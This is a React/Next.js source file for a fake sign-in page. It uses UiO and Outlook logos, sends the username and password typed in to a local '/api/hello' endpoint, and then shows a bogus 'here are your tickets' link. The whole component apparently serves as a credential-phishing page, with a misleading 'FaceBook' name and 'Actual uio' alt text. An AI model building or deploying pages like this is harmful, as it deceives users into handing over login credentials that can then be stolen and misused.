import Image from 'next/image'
import Uio from '../../public/uio.png'
import Outlook from '../../public/outlook.png'
import { useState } from 'react'

const FaceBook = () => {
  const [userName, setUserName] = useState('')
  const [password, setPassword] = useState('')
  const [alreadySent, setAlreadySent] = useState(false)
  const [response, setResponse] = useState<unknown>(null)

  const onSubmit = (e: any) => {
    e.preventDefault()

    if (!userName || !password || alreadySent) {
      return
    }
    fetch('/api/hello', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        userName,
        password,
      }),
    }).then((res) => {
      setResponse(res)
    })
    setAlreadySent(true)
  }

  return (
    <div className="flex w-screen h-screen bg-[#f9f9f9]">
      <div className="w-[300px] bg-black">
        <div className="flex p-[60px] mt-40">
          <Image src={Outlook} alt="Actual uio" />
        </div>
      </div>
      <div className="prose flex-1 flex mt-40">
        <div className="pl-10">
          <div className="flex">
            <Image src={Uio} alt="Actual uio" />
          </div>
          <form className="flex flex-col w-[250px]">
            <label>
              Username:
              <input
                name="username"
                type="username"
                value={userName}
                placeholder="Username"
                className="mb-2"
                onChange={(e) => setUserName(e.target.value)}
              />
            </label>
            <label>
              Password:
              <input
                name="password"
                type="password"
                value={password}
                placeholder="Password"
                onChange={(e) => setPassword(e.target.value)}
              />
            </label>
            {/* submit button */}
            <button
              className="self-start font-bold mt-2 pl-5 text-blue-900 text-[24px]"
              type="submit"
              name="Submit"
              onClick={onSubmit}
            >
              &rarr; sign in
            </button>
          </form>

          {response ? (
            <div className="mt-10 flex gap-4">
              Thanks! Here are your tickets:
              <a href="https://www.dailymotion.com/video/x5ykzv">Ticket link</a>
            </div>
          ) : null}
        </div>
      </div>
    </div>
  )
}

export default FaceBook
